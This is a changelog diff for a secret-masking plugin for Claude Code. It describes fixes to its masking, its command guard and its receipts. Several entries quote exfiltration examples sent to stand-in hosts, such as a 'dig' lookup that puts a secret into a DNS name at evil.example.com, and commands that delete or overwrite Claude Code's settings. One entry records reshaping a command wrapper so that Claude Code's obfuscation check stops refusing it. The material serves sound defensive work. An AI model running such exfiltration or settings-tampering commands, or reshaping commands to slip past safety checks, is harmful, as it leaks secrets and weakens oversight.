@@ -1,5 +1,389 @@
 # Changelog
 
+## 1.0.0
+
+Features: +install.auto-update, +install.first-run, +runtime.node, +hooks.watchdog,
++proxy.lifecycle, +proxy.upstream, +mask.prompt-hook, +mask.background-output, +mask.documents,
++mask.write-input, +token.format, +restore.bash, +restore.powershell, +restore.file-tools,
++restore.mcp-server, +restore.scope, +restore.uncertain-destination, +pass.ran-with-token,
++allow.builtin-hosts, +guard.file-tools, +guard.shell, +guard.host-cli, +detect.secrets-context,
++detect.known-values, +detect.typed-random, +unmask.command, +unmask.end-status,
++receipt.stop-line, +receipt.retention, +receipt.slip-command, +report-miss.on-request,
++statusline.style, +statusline.json, +cmd.status, +mgmt.fix-commands, +settings.show,
++settings.user-config, +settings.repo-tighten-only, +proxy.toggle, +doctor, +vault.encrypted,
++platform.macos, +platform.linux, +platform.windows, +shell.powershell, ~install.plugin,
+~mask.prompt, ~mask.context, ~mask.tool-output, ~mask.file-read, ~display.real-values,
+~stop.disallowed-host, ~allow.user-command, ~pass.uncertain-notice, ~settings.uncertain-block,
+~detect.keys-gitleaks, ~detect.pii-33, ~unmask.dialog, ~receipt.signed, ~report.local,
+~report-miss, ~banner.session-start, ~statusline, ~mgmt.user-authority, ~vault.retention,
+~uninstall.clean, -restore.allowed-host, -statusline.custom, -guard.settings, -proxy.manage (see
+[docs/features.md](docs/features.md))
+
+### Fixes from live use of 1.0.0-rc.1 and rc.2
+
+- **A value from your context is put back in a local command.** An email Claude Code loads from
+  `CLAUDE.md` reaches the model as a token. When Claude set it as the git author
+  (`git -c user.email=<token> commit`), the commit was made with the token text. Two causes, both
+  fixed: the proxy also masked sessions ZeroH's hooks don't run in (a session with the plugin
+  disabled, or one Claude Code starts without plugins), where nothing can put a token back; those
+  sessions now pass through unmasked, as without ZeroH. And in a session with the hooks, the
+  address's own domain was read as a destination, so the restore was stopped; an email address
+  used as data is no longer a destination (`ssh user@host` still names one).
+- **An `az` command to your own server is no longer stopped twice.** Claude created an Azure Bot
+  whose endpoint was `https://pm.<IP>.sslip.io/…` with `--query sku.name`, after ZeroH had masked
+  the server's IP. The command was stopped as the IP leaving for `pm.<IP>.sslip.io` and for
+  `sku.name`. Both fixed: an IP address put back into a host that is that address or is built
+  from it (`sslip.io`, `nip.io`, `https://<IP>:8443`, `ssh root@<IP>`) is where the call goes,
+  not data sent there; and a bare dotted word (`sku.name`, `compute.zone`, `image.tag=…`,
+  `app.kubernetes.io/name`, `-o jsonpath={.status}`, `config.yaml`) or address is a destination
+  only as a network command's operand, in a URL, as `user@host` or as `host:port`, no longer
+  because its last label happens to be a TLD. A command ZeroH can't read (`az`, `aws`, `gcloud`,
+  `kubectl`, `terraform`, `docker`) is an uncertain destination as before: it runs with a notice,
+  and `block` mode denies it. A key put back towards a URL or network operand that isn't allowed
+  for it is still stopped, and so is an IP sent to any other host.
+- **The receipt says when a value went out in plain text.** `raw_content_sent_to_ai_provider` was
+  always `false`, even for a prompt sent as typed while the proxy wasn't running. It is now `true`
+  for such a prompt, and the signed turn summary says the same for the whole turn (values shown
+  under an unmask grant included) as `values_sent_to_ai_provider`, a name of its own so the two
+  scopes can't be confused. Earlier receipts still verify.
+- **A plain word is masked where it appears as a password, no longer everywhere.** A lowercase
+  word typed after `password=` was masked as a PASSWORD, and then everywhere that word appeared,
+  in every later file and command output. It is still masked where it follows `password=` (the
+  same text is a real password in a shell export, a connection string or a sentence that tells
+  one; `/zeroh-disclosure:unmask` shows it), but a plain word ZeroH found by the name before it,
+  typed or in output, is no longer matched anywhere else. Such words kept from earlier versions
+  stop spreading too. Your `.env` and credential-file values and values you report still match
+  everywhere.
+- **GitHub App tokens in their new format are masked whole.** GitHub App installation tokens,
+  including the Actions `GITHUB_TOKEN`, now come as `ghs_<app id>_<JWT>` (about 520 characters,
+  two dots; [GitHub changelog](https://github.blog/changelog/2026-05-15-github-app-installation-tokens-per-request-override-header/)).
+  The gitleaks rules match only the old 40-character form, so such a token in a prompt, a file or
+  command output was not found. A local rule in the detection engine now finds it and masks all of
+  it; the old form is still found. GitHub announced no new format for its other token types.
+
+### Fixes from the architecture review
+
+- **No dead tokens when the vault can't be saved.** A vault that opens but can't be saved (another
+  writer holds its lock, a disk error) made ZeroH send new values as tokens nothing could put back.
+  Every mask path (the proxy, tool output, a raw secret written into a file) now keeps masked only
+  the values already on disk and passes new ones unmasked, with the line "not protected (ZeroH
+  couldn't save its vault) · /zeroh-disclosure:doctor", counted under a new reason,
+  `vault-unsaveable`. The proxy can't show a line itself, so the turn's Stop line says it. With
+  `uncertain block` the output is withheld or the call stopped instead.
+- **A proxy without a login item no longer strands a session.** Where the system refuses the login
+  item, the proxy leaves once no ZeroH session is live. It closed its port, so a session still
+  using it (the plugin disabled in that project, or a session Claude Code started without plugins)
+  failed with "Connection refused". It now takes its settings entries out as before and then keeps
+  serving that session, unmasked, until it has been idle for 12 hours; the next ZeroH session
+  replaces it.
+- **After uninstall the proxy masks nothing.** The retired proxy kept replacing values it knew with
+  tokens after uninstall, though the vault and hooks that put tokens back were gone, so commands and
+  the screen got dead tokens. It now passes everything through until the session ends. After
+  `proxy off` and `doctor --fix` it still masks the values it masked before (the vault and hooks
+  remain), and a session it never masked passes through, as before it retired.
+- **Claude Code's settings are protected however git or an archiver is called.** The guard read
+  program options with checks of its own, apart from the destination check, and they had drifted:
+  `git -C /tmp rm ~/.claude/settings.json` was read as the subcommand `/tmp` and passed, as did
+  `tar --to-command=sh`, `sort --compress-program=sh`, `zip -TT` and `sort -o` against a settings
+  file, while `rg -e --pre` (searching for the text `--pre`) was stopped. The guard now uses the same
+  readers as the destination check, so these are stopped (or read) the same way everywhere.
+- **The turn summary's format is frozen.** `zeroh-turn-summary/v1` verifies only with exactly the
+  fields 1.0.0 signs; a new field will be a `v2` schema. A development build's summary without
+  `values_sent_to_ai_provider` no longer verifies (no release signed one). Receipts from release
+  candidates, which have no summary, still verify as covering the typed prompt only.
+- **What ZeroH says matches what it does.** `/zeroh-disclosure:status` said a secret in the prompt
+  that puts a session behind the proxy "is stopped, not sent"; by default it is sent with a "not
+  protected" line (stopped with `uncertain block`), and the line now says whichever applies. The
+  full banner of a session whose proxy is down said both that a secret is sent with a notice and
+  that it is stopped; no prompt is sent until the proxy is back, and it now says only that. The
+  unused "no login item, what you type can't be masked" state is gone (without a login item the
+  proxy runs for the session and masks typing). The how-to and troubleshooting pages no longer
+  say that requests the proxy can't tie to a ZeroH session are masked: they pass through unmasked.
+
+### Fixes from the pre-1.0.0 review
+
+- **Unpacking an archive into Claude Code's settings is stopped.** `tar -xf a.tar -C ~/.claude
+settings.json` replaced `settings.json` with no stop and no line. The command reader now resolves
+  the files `tar`, `unzip -d` and `7z x -o` extract against their folder, so a named protected file
+  is the default stop; unpacking files ZeroH can't name into a protected folder runs with the "not
+  protected" line (`uncertain block` stops it).
+- **A retired proxy masks each session with its own project's values.** After `proxy off` or
+  `doctor --fix` the retired proxy used one catalog of every project's values for every session,
+  so a value known only in one project reached another project's session as a token nothing there
+  could put back.
+- **A prompt sent as typed because the vault couldn't be saved says so.** The proxy then masks only
+  the values already in the vault, but the receipt, the Stop line ("1 value masked", "Claude saw
+  ⟦…⟧") and the signed turn summary said the new values were masked. They now count them as sent
+  (`values_sent`, `values_sent_to_ai_provider`, `raw_content_sent_to_ai_provider`), and the
+  "not protected" record of the prompt is kept. With `uncertain block` the proxy also passes such
+  values, by design: refusing the request would end the session (see the
+  [product principles](docs/product-principles.md)).
+- **A value put back into a DNS name is checked.** `dig -q <token>.evil.example.com` ran with the
+  real value in both modes: the value of `-q` was read as an option value, not a name. Every
+  option of a network program that names a host, a name or a URL is now a destination (`dig -q`
+  and `-x`, `curl --dns-servers` and `--ipfs-gateway`, `wget -e http_proxy=`, the proxy options of
+  `aria2c`, `httpie` and `ncat`, SOCKS and PROXY addresses in `socat`, `ssh -W`, `-L` and `-R`,
+  the ssh inside `rsync -e` and `mosh --ssh`, `git remote add` and `set-url`, `openssl
+-servername`, `traceroute -g`, `mtr`, `tracepath`, `Resolve-DnsName -Name/-Server`); what reads
+  names from a file (`dig -f`, `drill -f`, `mtr -F`) or runs a program (`socat SYSTEM:`, `scp -S`)
+  is uncertain. A name with a token in one of its labels is the destination as a whole, so a value
+  that can't be read as a host name stops too, and a deny shows such a name with the token, never
+  the value.
+- **A value in a name lookup is checked wherever it stands.** `dig +domain=<token>.evil.example
+probe` and `nslookup -domain=…` ran with the value in a search domain. For the programs that look
+  names up (`dig`, `nslookup`, `host`, `drill`, `delv`, `kdig`, `getent hosts`, `resolvectl`,
+  `dscacheutil`, `nmap`, `Resolve-DnsName`) every argument with a value put back in it is now a
+  destination, since the name servers receive it; an IP address looked up as itself is its own.
+- **Only an IP address's own name is exempt for it.** A restored IP was accepted for any host that
+  contained it (`203.0.113.7.evil.example.com`), and then also as data in the same command. The
+  exception now covers exactly the address (any port, `[v6]`) and its names on the address-mapping
+  services `sslip.io` and `nip.io` (`<ip>.sslip.io`, `<a-b-c-d>.sslip.io`, `pm.<ip>.sslip.io`,
+  `pm-<a-b-c-d>.nip.io`, IPv6 as `2001-db8--1.sslip.io`); the address as data to that same host is
+  allowed, as data to any other host it is checked.
+  A mapping name counts only when the address is the only address-like sequence in it: the
+  services pick the first one, so `198.51.100.9.x.<ip>.sslip.io` goes to 198.51.100.9.
+- **Text a shell does not expand is never a variable.** After PowerShell's `--%` everything is
+  passed as written, so a credential there is a literal: it was taken for a variable and ran with a
+  notice. It now stops like any literal when its host isn't allowed. The same holds for single
+  quotes, here-strings and backtick escapes in PowerShell and for `$'…'`, backslash escapes and
+  quoted here-docs in Bash. Code handed to another shell (`eval`, `bash -c`, `pwsh -Command`, `iex`,
+  `cmd /c`, `env -S`) is read twice, so a variable written into it is not proven to be the value;
+  where that code is one single-quoted string, the inner shell's own reading decides. Checked
+  against real Bash and PowerShell.
+- **A variable you typed in the prompt is judged as a variable.** Your prompt's
+  `-u "<variable>:"` reached Claude as a token (the detector masks references like any value);
+  Claude ran the command with the token, and ZeroH stopped `api.stripe.com` as a secret leaving.
+  A value put back that, in the command's shell, is only a variable reference is now judged like
+  one Claude wrote: it runs with the "not protected (a variable whose value ZeroH cannot see)" line
+  (`uncertain block` stops it). Being a variable's name, not a value, it is put back inline where
+  the token stands, so the shell expands your variable as typed (it was sent as its name before):
+  only where that occurrence is expanded by the shell, and braced (`${STRIPE_KEY}_SUFFIX`) so the
+  name keeps its end. An occurrence the shell reads as text (single quotes, `$'…'`, an escape,
+  after `--%`) is a value like any other: checked against its host and put back as text.
+- **A token after PowerShell's `--%` is not put back as a variable name.** PowerShell passes that
+  text as written, so the late-bound variable arrived as its own name. Only a real stop-parsing
+  token counts, as the command reader finds it; `--%` inside a string or a comment is text. ZeroH never writes a real
+  value into the command text, so such a call follows the rule for a value that can't be put back
+  safely: it runs with the token and a notice (`uncertain block` stops it).
+- **A kept receipt's unmask record can't be edited after uninstall.** Uninstall now signs, with the
+  receipt's own key, the exact unmask record it checked; `verify` fails a kept receipt whose record
+  changed since, and says "unavailable" (not passed) for one kept without that signature.
+
+### Fixes from the macOS and Windows test runs
+
+- **One project, whatever path leads to it.** ZeroH keys a project's vault, allow list, unmask
+  grants and receipts on the folder with links resolved. On macOS a folder under `/var` or `/tmp`
+  is `/private/var` or `/private/tmp` to a terminal, so `zeroh-disclosure allow` in a terminal and
+  the hooks in Claude Code kept that project twice; the same held for any project under a linked
+  folder.
+- **Credential files in a linked home are read again.** When the home folder itself sat behind a
+  link, every credential file in it (`~/.aws/credentials`, `~/.npmrc`, `~/.netrc`, …) was refused,
+  so their values were not known secrets.
+- **Commands with a backslash restore correctly in Git Bash on Windows.** Git Bash reads a pair of
+  backslashes on its command line as one, so a restored command whose heredoc line ended in `\`
+  joined the next line, and `"\[TOKEN]"` printed a variable name. ZeroH no longer writes a new
+  pair of backslashes into the command it hands to Git Bash.
+- **Git Bash drive paths are protected.** A Bash command on Windows that wrote ZeroH's plugin files
+  or Claude Code's settings through `/c/Users/…` was not recognised as one; it now is, like
+  `C:\Users\…`.
+- **A Windows install is no longer reported as stale.** Git for Windows checks text files out
+  with CRLF line ends, and the integrity check compared them byte for byte with the release. It
+  now compares them as Git stores them. The plugin's checkout also keeps LF line ends.
+- **`~/.netrc` counts on Windows too.** curl reads `%USERPROFILE%\.netrc` before `_netrc`; ZeroH
+  now knows the passwords in both, and treats `_netrc` as a sensitive file.
+- **An early `exit 0` is not a failure.** A Bash command that ended with `exit 0` got the line
+  "the command failed with exit status 0".
+- **The status line is red for a ZeroH home it can't use on Windows** (a home below a file), not
+  "starting".
+- **The ZeroH home on Windows is really yours only.** ZeroH gives its home an ACL for you and
+  SYSTEM only, but a folder that already had entries of its own (a `ZEROH_HOME` on a shared drive,
+  a temporary folder) kept them, so Administrators or Everyone could still read the vault and keys.
+  Those entries are removed now, and a home an earlier build set up is fixed at the next write.
+- **Parallel first use and parallel unmask changes work on Windows.** Two sessions starting at once
+  on a fresh install could fail with "vault key missing", and a grant made while another was
+  revoked could fail with `EPERM` (Windows reports a lock file still being deleted that way).
+
+### Fixes from the Windows 11 test of 1.0.0-rc.2
+
+- **The login item registers on Windows.** `schtasks /Create /XML` refused the task file ("The task
+  XML is malformed … unable to switch the encoding"), because it was saved as UTF-8. It is now
+  saved as UTF-16 with a byte order mark and declares `encoding="UTF-16"`, the form Task Scheduler
+  reads. A UTF-8 file an earlier release left behind is registered again at the next session.
+- **No login item no longer means typed secrets go out unmasked.** Where the system refuses the
+  login item (a locked-down PC, a managed Mac, SSH, WSL or a container), ZeroH now starts its local
+  proxy for the session anyway, so what you type is masked. With no ZeroH session open, the proxy
+  takes its settings entry out and stops, so a Claude Code session never meets a dead port; the
+  next session starts it again and tries the login item again. The banner, `/zeroh-disclosure:status`
+  and `/zeroh-disclosure:doctor` say "no login item", with the reason the system gave (for example
+  `schtasks refused it: "ERROR: The task XML is malformed."`) and the fix for your system.
+- **"Sent" means one thing everywhere.** A key typed once was counted by the detector and again as a
+  known value from `.env` (2 values typed, "4 sent"), while the receipt said 0. "Sent" is now each
+  value that reached the model in plain text, counted once: a typed value sent without the proxy
+  plus values shown under an unmask grant. The status line, the Stop line, the receipt slip and
+  `/zeroh-disclosure:report` all count it this way ([receipt format](docs/receipt-format.md#the-signed-turn-summary)).
+- **The receipt signs everything it shows.** The receipt signed when you send a prompt covers the
+  typed prompt; a turn summary signed at Stop now covers the rest: file reads and command output
+  masked, values sent, destinations, formats and operations that passed unchecked, and misses
+  reported. The receipt and slip show the signed numbers, and `zeroh-disclosure verify` fails when
+  any of them changes. Receipts from earlier versions still verify and say they cover the typed
+  prompt only.
+- **A restored command runs headless.** Claude Code refused ZeroH's rewrite of try step 6 ("Contains
+  brace with quote character (expansion obfuscation)"): the wrapper ran the command in a `{ … }`
+  group, and Claude Code's check (`/\{[^}]*['"]/` outside quotes, Claude Code 2.1.281 to 2.1.283)
+  flags any group with a quote in it. The command now runs in the `then` branch of the `if` that
+  loads the values, and every rewrite is tested against that check. PowerShell reads restored
+  values with cmdlets only (`Import-Csv` from a CSV values file, no .NET calls, which Claude Code's
+  PowerShell checks ask about). A values file whose command never ran is removed at once when
+  Claude Code reports the failure or refusal (`PostToolUseFailure`, `PermissionDenied`), or at the
+  end of the turn, not at the next session.
+- **A shell variable is not a key.** When Claude wrote `curl -u "$STRIPE_KEY:"`, the curl-credential
+  rule took the variable reference for the key and ZeroH blocked `api.stripe.com` as a raw secret.
+  The command now runs. Whether `$KEY` is a variable or literal text depends on which program reads
+  it, so the detector no longer guesses: it masks a reference like any value (restorable; it is put
+  back in commands and on screen), as rc.2 did, and literal passwords that look like references
+  (`${X-hunter2x}`, `$X-hunter2x`, which rc.2 also missed) are masked too. The stop is decided where
+  the shell is known: in a Bash or PowerShell command, a value that, as that shell parses it, is
+  only variable references (`$KEY`, `${KEY}`, `$1`, `$env:KEY`, `${env:KEY}`, PowerShell's
+  `$($env:KEY)`, joined by `:`) is not
+  a raw secret. ZeroH can't see what the variable holds, so a command that sends it somewhere runs
+  with the line "not protected (a variable whose value ZeroH cannot see)" and a new receipt reason,
+  `variable-in-command`; `uncertain block` stops it. Anything with a literal in it (single quotes,
+  `%KEY%` or `{{x}}` in Bash, a default, a command substitution) still stops as before when its
+  host isn't allowed.
+- **`/zeroh-disclosure:status` says what is true.** It shows whether the local proxy is running and
+  whether this session goes through it, and whether a login item starts it after a restart (and if
+  not, why and how to fix it), instead of saying typing is masked when no proxy runs.
+- **The try-it example is the Stripe one.** The `httpbin.org` demo never finished reliably; the
+  how-to and the about skill now use the website's test guide: a made-up key, `api.stripe.com`, and
+  a `401 Invalid API Key` whose last four characters prove the real value arrived.
+- **`@zeroh` not found.** A Claude Code profile that added the public marketplace before its rename
+  on 25 September keeps it as `zeroh-marketplace`. The first prompt and `/zeroh-disclosure:doctor`
+  now say so, with the commands: `claude plugin marketplace remove zeroh-marketplace`, then
+  `claude plugin marketplace add Blade-Labs/zeroh-marketplace` and
+  `claude plugin install zeroh-disclosure@zeroh`. The marketplace README's install steps check for it.
+
+### The session banner: big once, then one line
+
+The big ZEROH banner no longer greets you every session. The first session after the install still
+shows it with what is masked; every later session shows one line:
+
+```text
+ZeroH Disclosure ✓ Protected: your secrets are masked · Free · /zeroh-disclosure:status
+```
+
+The line is honest: when something needs attention it says so and names the fix, for example
+`ZeroH Disclosure ⚠ Paused: see the message below · Free · /zeroh-disclosure:doctor`, or
+`/zeroh-disclosure:proxy on` after you turned the proxy off. Warnings still print below it.
+
+`/zeroh-disclosure:settings banner big|compact|mini|off` chooses: `big` is the ZEROH banner every
+session, `mini` the one line (the default), `compact` one line with the secret count. A `full` saved
+or set in `ZEROH_BANNER` before 1.0.0 keeps working and means `big`.
+
+The full view after the install is shorter too: under the art, one line says it runs on your machine
+and what it masks, one says what passes (images and scanned PDFs), and one gives the question to ask
+Claude. The proxy's own state is no longer repeated there; when it matters, its warning line says so.
+
+### Uninstall in one step, and the session you are in keeps working
+
+- `/zeroh-disclosure:uninstall` removes ZeroH in one step: typing the user-only command is the
+  confirmation. `--dry-run` only shows what it would remove, and `--yes` is still accepted. In a
+  terminal, `zeroh-disclosure uninstall` still needs `--yes`, since a script could call it.
+- Uninstall, `/zeroh-disclosure:proxy off` and `doctor --fix` no longer stop the local proxy under
+  the session you typed them in. A running Claude Code session keeps the proxy address it started
+  with, so a stopped proxy made its next request fail ("Connection refused", ten retries). The proxy
+  is now retired instead: it keeps forwarding for the sessions still open and stops by itself once
+  no request has come for 12 hours. After `proxy off` and `doctor --fix` it masks only the values
+  Claude already saw as tokens (from memory, never written) and nothing new; after uninstall it
+  masks nothing, since the vault and hooks that could put a token back are gone. Its login item is
+  gone on macOS, Linux and Windows, so nothing starts it again. Uninstall says so: "This session
+  keeps working until you exit, without ZeroH's masking; new sessions start without ZeroH."
+- Uninstall keeps your receipts. Everything else goes (the vault and keys, your settings, allow
+  rules, grants, reports, the proxy's runtime copy); every signed receipt, `receipt.html` and
+  session bundle, with the public keys that verify them, move to `~/ZeroH Receipts`
+  (`%LOCALAPPDATA%\ZeroH Receipts` on Windows). They hold no values, no private key and no vault.
+  The output (and `--dry-run`) says where they are and how to delete them; `--delete-receipts`
+  removes them too, with any an earlier uninstall kept. `verify` still checks a kept receipt after
+  a new install.
+
+### Real values on screen, reliably
+
+A reply could show a plain token such as `[EMAIL-…]` where the real value belonged (seen in a fenced
+code block on rc.1). Claude Code shows a reply in flushes of whole lines, so a token is never cut in
+two; but a flush whose display hook runs out of time is shown as Claude Code sent it, with tokens.
+The hook now loads only what it needs (no detectors, no proxy code), answers before it saves the
+vault's last-use bookkeeping, and an answer already given stands even if that bookkeeping runs late.
+In a Claude Code version that does cut a token across two flushes, the fragment is held back and
+shown whole with the next flush, never lost or repeated. `ZEROH_DISPLAY_TRACE=1` logs how a reply
+was flushed (lengths only, never text).
+
+### Updating from a release candidate
+
+- `claude plugin update` keeps a plugin folder that already exists for the new version (Claude Code
+  2.1.283), so a `plugins/cache/zeroh/zeroh-disclosure/<version>` folder an earlier build left
+  behind stays in use. `/zeroh-disclosure:doctor` and the session start now compare the folder with
+  the release Claude Code recorded, say when it differs, and give the fix (quit Claude Code, remove
+  that folder, `claude plugin install zeroh-disclosure@zeroh`). See
+  [troubleshooting](docs/troubleshooting.md#an-update-left-an-old-plugin-folder-in-use).
+- A release candidate now sorts below its release, so a session of 1.0.0-rc.x left open after the
+  update never copies its proxy back over 1.0.0's. (rc.2 itself compares them as equal: close rc.2
+  sessions before updating.) The update from 1.0.0-rc.2 is checked live (`update-flow.mjs`).
+- Projects are keyed on their path with links resolved (see "One project, whatever path leads to
+  it" above), and there is no migration from a release candidate's key. If your project sits under
+  a linked folder (on macOS, anything under `/tmp` or `/var` counts), it starts 1.0.0 with an empty
+  vault, no allow rules and no unmask grants: tokens in a conversation resumed from the release
+  candidate run as the token text (with the "ran with the token" line), and you allow hosts again
+  with `/zeroh-disclosure:allow`. Receipts of the release candidate stay in its old folder. Values
+  the vault held expire after 7 days anyway.
+
+### Claude knows when to suggest doctor
+
+The install steps no longer end with a pointer to `/zeroh-disclosure:doctor`. Instead the session
+briefing tells Claude to suggest it when you say protection isn't working or ZeroH shows 🟡 or 🔴.
+Claude never runs it itself.
+
+### The feature list, checked against the code
+
+Apart from the changes above, nothing the plugin does has changed. The [feature list](docs/features.md) was checked against the
+code and the tests on 2026-09-28, and the Codex and OpenCode columns against the hosts' current
+releases:
+
+- **66 features in ten areas**, each area its own table (it was 25 rows in one table). The `+` IDs
+  above shipped already and now have a row of their own. A feature that works the same way on every
+  host, or a subcommand of a larger feature, stays in that feature's row.
+- **Split where hosts differ:** `restore.allowed-host` became `restore.bash` and
+  `restore.powershell`, with rows for file tools, MCP servers, where real values never go and
+  uncertain destinations; `guard.settings` became `guard.file-tools`, `guard.shell` and
+  `guard.host-cli`; `statusline.custom` became `statusline.style` and `statusline.json`;
+  `proxy.manage` became `proxy.toggle` and `doctor`; prompts masked by the proxy
+  (`mask.prompt`) and checked by the hook (`mask.prompt-hook`) are separate rows.
+- **Says what the default does.** A prompt typed while the proxy isn't running, or the one that
+  sets it up, is sent with a notice; a value bound for a destination ZeroH can't read is restored
+  with a notice; a command whose effect on ZeroH's files can't be read runs with a notice. The key
+  count reads "221 key-format rules from gitleaks v8.30.1: 214 for a named provider's keys and 7
+  generic ones"; personal data is "decided by" a library or published rule, not always a checksum;
+  `/zeroh-disclosure:report` prints text (HTML and JSON come from the command-line tool); values
+  leave the vault after 7 days without use.
+- **Platforms:** Codex CLI 0.158.0, OpenCode 1.x (`opencode-ai` 1.18.33) and OpenCode 2
+  (`@opencode/cli` 2.0.18, a separate package with a new plugin API, now its own column), each
+  status with a short note and, in `docs/features.json`, the sources it rests on. GitHub Copilot,
+  Cursor and Gemini CLI get a "Next platforms" table for the core features.
+- `docs/features.json` gains `area`, `core` and per-platform `sources`; old fields are unchanged.
+- [docs/parity-open-questions.md](docs/parity-open-questions.md) lists the questions only a live
+  run can answer, each with its check.
+
+### Corrections
+
+- README: the version badge, the settings command's arguments, and the hosts that are always
+  allowed: `localhost`, all of `127.0.0.0/8`, `0.0.0.0` and `::1` (the code already allowed them).
+- The rc.2 `Features:` line missed IDs whose Claude Code behaviour changed in rc.2: `~mask.prompt`
+  (without the proxy a typed secret is sent with a notice, no longer stopped),
+  `~restore.allowed-host` (uncertain destinations), `~allow.user-command`, `~proxy.manage`,
+  `~uninstall.clean` and `~vault.retention` (management applied on the typed prompt; `vault clear`
+  needs `--yes`; `uninstall` without `--yes` only shows what it would remove), `~report.local` and
+  `~receipt.signed` (counts read from the signed receipt), and `~mask.context` (a vault that can't
+  be opened passes content with a line). The rc.2 section stays as published, so it matches the
+  rc.2 release notes.
+
 ## 1.0.0-rc.2
 
 Features: +statusline, +statusline.custom, +settings.uncertain-block, ~install.plugin, ~mask.tool-output,
